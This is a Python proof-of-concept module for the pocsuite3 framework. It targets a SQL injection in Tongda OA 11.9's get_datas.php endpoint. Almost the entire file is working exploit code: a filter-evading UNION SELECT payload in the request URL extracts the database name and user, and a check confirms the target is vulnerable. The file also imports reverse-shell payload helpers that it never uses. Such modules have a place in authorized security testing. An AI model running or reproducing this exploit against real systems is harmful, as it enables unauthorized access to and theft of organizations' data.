from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import base64
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '通达OA11.9前台注入 get_datas.php前台注入'
    appName = '通达OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022攻防演习期间，通达OA被曝存在SQL注入漏洞，攻击者可以利用漏洞直接获取敏感数据。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        target = self.url+'''/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe\\re%201={`\\=%27`%201}%20un\\ion%20(s\\elect%20database(),%20us\\er())--%20%27'''
        txt="https://ad-calcium.github.io/2021/10/%E9%80%9A%E8%BE%BEoa11.9%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/"
        try:
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "td_oa" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = self.url+"/general/reportshop/utils/get_datas.php"
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)